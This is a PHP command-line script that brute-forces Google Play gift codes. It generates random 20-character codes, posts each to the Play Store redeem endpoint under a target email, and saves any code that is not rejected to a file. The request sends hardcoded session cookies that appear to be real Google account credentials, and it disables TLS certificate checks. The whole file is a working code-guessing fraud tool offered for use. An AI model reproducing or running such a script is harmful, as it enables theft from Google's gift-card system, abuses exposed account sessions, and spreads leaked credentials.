<?php error_reporting(0); class googleplay { function __construct() { 
echo "Email Address: ";
$this->email = trim(fgets(STDIN)); 
echo "Total Send: "; 
$this->total = trim(fgets(STDIN)); 
} 
public function RandomAngka() {
	$var = '0123456789ABCDEFGHIJKLMOPQRSTUVWXYZ'; 
	$res = ""; 
	for($i = 0;$i < 20;$i++) {
		$rand = rand(0, strlen($var)-1); $res .= $var{$rand}; }

    return $res;
}
public function save($namefile = null, $content = null) {
    $fp = fopen($namefile, "a+");
    $fw = fwrite($fp, $content);
    if($fw) {
        return true;
        fclose($fp);
    }else {
        return false;
        fclose($cp);
    }
}
public function exec() {
    for($i = 1; $i <= $this->total; $i++) {
        $code = $this->RandomAngka();
        $get = $this->get("https://play.google.com/store");
        preg_match_all("~(Set-Cookie: PLAY_PREFS=(.*?);)~",$get, $match);
        preg_match_all("~(Set-Cookie: NID=(.*?);)~", $get, $matches);
        $send = $this->sendcode($this->email, $code, $match[2][0], $matches[2][0]);
        if($send[15] == 2) {
            echo "[$i] CODE: $code => INVALID CODE\n";
        } else if($send[15] == 0) {
            echo "[$i] CODE: $code => HAS BEEN USED\n";
        } else if($send[15] == 4) {
            echo "[$i] CODE: $code => NEED CONFIRMATION\n";
        } else {
            echo "[$i] CODE: $code => CHECK YOUR ACCOUNT\n";
            $this->save('google.txt', $code."\r\n");
        }
        unlink("cookies");
    }
}
public function sendcode($email, $code, $cook, $ciik) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://play.google.com/store/onewayredeem?authuser=0");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, "code={$code}&emailAddress=".urlencode($email)."&userConfirmed=true&pctok=W1tudWxsLG51bGwsbnVsbCxbbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLFtdXSxudWxsLG51bGwsImlkIiwxLDEsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLFtdLFtdLG51bGwsbnVsbCxbXV0sWyJodHRwczovL3BheW1lbnRzLmdvb2dsZS5jb20vcGF5bWVudHMvcmVkaXJlY3RfZm9ybV9sYW5kaW5nP3N1Y2Nlc3M9dHJ1ZSIsImh0dHBzOi8vcGF5bWVudHMuZ29vZ2xlLmNvbS9wYXltZW50cy9yZWRpcmVjdF9mb3JtX2xhbmRpbmc%2Fc3VjY2Vzcz1mYWxzZSIsbnVsbCxbXV1d&xhr=1&token=NB-zAM67rXkgUbDgKgPh6OJUo4I%3A1519038342102");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd()."/cookie");
    curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd()."/cookie");
    $headers = array();
    $headers[] = "Origin: https://play.google.com";
    $headers[] = "Accept-Encoding: gzip, deflate, br";
    $headers[] = "Accept-Language: en-GB,en-US;q=0.9,en;q=0.8";
    $headers[] = "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36";
    $headers[] = "Content-Type: application/x-www-form-urlencoded";
    $headers[] = "Accept: */*";
    $headers[] = "Referer: https://play.google.com/store";
    $headers[] = "Authority: play.google.com";
    $headers[] = "Cookie: _ga=GA1.3.986360815.1516537370; CONSENT=YES+ID.en+20171015-09-1; HSID=ADVDJ6XlItVL3oRcy; SSID=As76BzhNLsJAMXuH8; APISID=s-6Ggdi7vrYNm65y/A3LYszTcz2sg260-D; SAPISID=YOE7WvrIGusoLyKt/AE73P3Qmb0cJaX2Gi; SID=vwWLYQ6WIO2mbD-0JgWTthEY_pItfaaf1I-gj0wqVaFLrxa_ufVTyYR9mnIbFSnntCTa9A.; NID=124={$ciik}; PLAY_ACTIVE_ACCOUNT=ICrt_XL61NBE_S0rhk8RpG0k65e0XwQVdDlvB6kxiQ8={$email}; PLAY_PREFS={$cook}; 1P_JAR=2018-2-19-11; S=billing-ui-v3=GAscMgxEK9MWtn__OCqYDF8IiE2p0iYh:billing-ui-v3-efe=GAscMgxEK9MWtn__OCqYDF8IiE2p0iYh; SIDCC=AAiTGe9Q_2sgSl3Mht_065YWd64m6fMVa0U9gDqIfhlCUwE6w04jMrDCiitnYpsZ25aSmD9oYw";
    $headers[] = "X-Client-Data: CJO2yQEIpLbJAQjEtskBCKmdygEIqKPKAQ==";
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

    $result = curl_exec($ch);

    return $result;
}
public function get($url) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_POST, 0);
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_HEADER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . "/cookies.txt");
    curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . "/cookies.txt");
    curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36");

    $result = curl_exec($ch);
    curl_close($ch);
    unlink("cookies.txt");

    return $result;
}
} //5MP3 UBLB 44TF BKU0 ARGJ 
$google = new googleplay; print_r($google->exec());
